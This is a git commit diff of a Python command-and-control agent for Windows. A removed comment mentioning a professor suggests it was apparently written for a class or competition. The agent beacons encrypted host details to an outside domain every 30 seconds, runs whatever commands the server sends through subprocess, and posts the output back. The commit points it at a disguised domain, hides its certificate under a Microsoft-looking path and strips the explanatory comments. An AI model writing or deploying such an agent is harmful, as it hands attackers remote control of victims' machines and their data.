7aa1a3a5e34820bf6d9ee7671074ad20e2623458
ctomassetti56 <143561959+ctomassetti56@users.noreply.github.com>
2026-03-14 22:13:30 -0400

    updated agent code

--- HTTPS C2 (Windows)/agent.py
+++ HTTPS C2 (Windows)/agent.py
@@ -6,18 +6,18 @@ import json
 from cryptography.fernet import Fernet
 
 # Encryption setup
-# Must be EXACT same string that is in server.py
 SECRET_KEY = b'7lJcf_dNt7Jhc87wCBcYO46b4XRy18upQmOKrij3B4k='
 cipher = Fernet(SECRET_KEY)
 
-# 1. THE FAILOVER LIST
-# Put the domain names your professor gave you here.
-# The agent will try these in order.
+# Failover list
 C2_DOMAINS = [
-    "http://127.0.0.1:5000"
+    "https://midevil-scoring-engine.com"
 ]
 
-# 2. SYSTEM INFO (For the 'Heartbeat')
+# Path to self signed cert
+CERT_PATH = r"C:\ProgramData\Microsoft\Network\Settings\nginx-selfsigned.crt"
+
+# Agent check if still alive
 def get_system_info():
     info = {
         "hostname": platform.node(),
@@ -30,20 +30,17 @@ def run_agent():
     print("[*] Secure Agent started. Beginning beaconing...")
     
     while True:
-        # Loop through each domain until one works
         for url in C2_DOMAINS:
             try:
 
                 raw_data = get_system_info()
                 encrypted_heartbeat = cipher.encrypt(raw_data.encode())
 
-                # Send heartbeat + ask for commands
-                # We use verify=False if you haven't set up the SSL certs yet
                 response = requests.post(
                     f"{url}/checkin", 
                     data=encrypted_heartbeat, 
                     timeout=10,
-                    verify=False 
+                    verify=CERT_PATH
                 )
 
                 if response.status_code == 200:
@@ -53,23 +50,18 @@ def run_agent():
                     if command and command.lower() != "none":
                         print(f"[*] Decrypted Command Recieved: {command}")
                         
-                        # Execute the command and get output
                         result = subprocess.getoutput(command)
                         
-                        # Send the result back to the server
                         encrypted_result = cipher.encrypt(result.encode())
-                        requests.post(f"{url}/result", data=encrypted_result, verify=False)
+                        requests.post(f"{url}/result", data=encrypted_result, verify=CERT_PATH)
                     
-                    # If we successfully talked to a server, break the 'for' loop 
-                    # and wait for the next heartbeat interval
                     break 
 
             except Exception as e:
                 print(f"[!] Failed to connect to {url}: {e}")
                 continue # Try the next domain in the list
         
-        # 3. THE BEACON INTERVAL
-        # Don't spam the server. Wait 30 seconds before checking in again.
+        # Beacon Interval
         print("[*] Sleeping for 30s...")
         time.sleep(30)
 
